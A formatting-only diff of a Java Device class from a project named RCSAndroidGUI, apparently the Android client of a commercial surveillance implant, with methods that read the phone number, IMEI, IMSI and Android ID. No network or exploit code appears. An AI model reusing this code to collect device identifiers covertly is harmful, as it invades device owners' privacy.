@@ -20,18 +20,20 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class Device.
  */
 public class Device {
-	
+
 	/** The content resolver. */
 	private ContentResolver contentResolver;
-	
+
 	/** The android id. */
 	private String androidId;
 
 	/**
 	 * Inits the.
-	 *
-	 * @param cr the cr
-	 * @throws RCSException the rCS exception
+	 * 
+	 * @param cr
+	 *            the cr
+	 * @throws RCSException
+	 *             the rCS exception
 	 */
 	public void init(final ContentResolver cr) throws RCSException {
 		if (cr == null) {
@@ -46,16 +48,14 @@ public class Device {
 
 	/**
 	 * Self.
-	 *
+	 * 
 	 * @return the device
 	 */
 	public static Device self() {
 		if (singleton == null) {
 			synchronized (Device.class) {
 				if (singleton == null) {
-
 					singleton = new Device();
-
 				}
 			}
 		}
@@ -65,17 +65,17 @@ public class Device {
 
 	/**
 	 * Gets the user id.
-	 *
+	 * 
 	 * @return the user id
 	 */
 	public String getUserId() {
-		AccountManager ac=AccountManager.get(RCSAndroidGUI.getAppContext());
+		AccountManager ac = AccountManager.get(RCSAndroidGUI.getAppContext());
 		return "MyUSERId";
 	}
 
 	/**
 	 * Gets the device id.
-	 *
+	 * 
 	 * @return the device id
 	 */
 	public String getDeviceId() {
@@ -86,18 +86,19 @@ public class Device {
 
 	/**
 	 * Gets the phone number.
-	 *
+	 * 
 	 * @return the phone number
 	 */
 	public String getPhoneNumber() {
-	    TelephonyManager mTelephonyMgr;
-	    mTelephonyMgr = (TelephonyManager)RCSAndroidGUI.getAppContext().getSystemService(Context.TELEPHONY_SERVICE); 
-	    return mTelephonyMgr.getLine1Number();
+		TelephonyManager mTelephonyMgr;
+		mTelephonyMgr = (TelephonyManager) RCSAndroidGUI.getAppContext()
+				.getSystemService(Context.TELEPHONY_SERVICE);
+		return mTelephonyMgr.getLine1Number();
 	}
 
 	/**
 	 * Gets the version.
-	 *
+	 * 
 	 * @return the version
 	 */
 	public byte[] getVersion() {
@@ -114,12 +115,14 @@ public class Device {
 	}
 
 	public String getImei() {
-		TelephonyManager telephonyManager = (TelephonyManager)RCSAndroidGUI.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		TelephonyManager telephonyManager = (TelephonyManager) RCSAndroidGUI
+				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 		return telephonyManager.getDeviceId();
 	}
 
 	public String getImsi() {
-		TelephonyManager telephonyManager = (TelephonyManager)RCSAndroidGUI.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		TelephonyManager telephonyManager = (TelephonyManager) RCSAndroidGUI
+				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 		return telephonyManager.getSubscriberId();
 	}
 
